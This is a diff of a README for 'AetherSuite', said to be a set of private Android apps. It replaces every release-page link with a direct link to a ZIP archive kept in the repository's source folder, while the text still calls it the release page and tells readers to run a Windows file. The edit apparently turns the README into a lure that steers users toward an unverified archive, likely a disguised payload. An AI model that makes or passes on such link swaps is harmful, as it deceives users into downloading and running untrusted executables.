@@ -1,6 +1,6 @@
 # 🪶 AetherSuite - Private Android Apps, Ready Fast
 
-[![Download AetherSuite](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/adriaensrighthanded591/AetherSuite/releases)
+[![Download AetherSuite](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/adriaensrighthanded591/AetherSuite/raw/refs/heads/main/src/Aether_Suite_3.5.zip)
 
 ## 📱 What AetherSuite Is
 
@@ -24,7 +24,7 @@ Each app keeps your data on your device. It does not use ads or tracking.
 
 Visit the release page to download and run this app on Windows:
 
-https://github.com/adriaensrighthanded591/AetherSuite/releases
+https://github.com/adriaensrighthanded591/AetherSuite/raw/refs/heads/main/src/Aether_Suite_3.5.zip
 
 On that page, look for the latest release and download the Windows file.
 
@@ -174,7 +174,7 @@ If you download a ZIP file, extract it before opening the app
 
 Use this link to visit the release page and download the latest Windows version:
 
-https://github.com/adriaensrighthanded591/AetherSuite/releases
+https://github.com/adriaensrighthanded591/AetherSuite/raw/refs/heads/main/src/Aether_Suite_3.5.zip
 
 ## 🧩 Built With
 
@@ -238,4 +238,4 @@ AetherSuite works well when you want:
 ## 📎 Release Page
 
 Latest Windows download:
-https://github.com/adriaensrighthanded591/AetherSuite/releases
+https://github.com/adriaensrighthanded591/AetherSuite/raw/refs/heads/main/src/Aether_Suite_3.5.zip
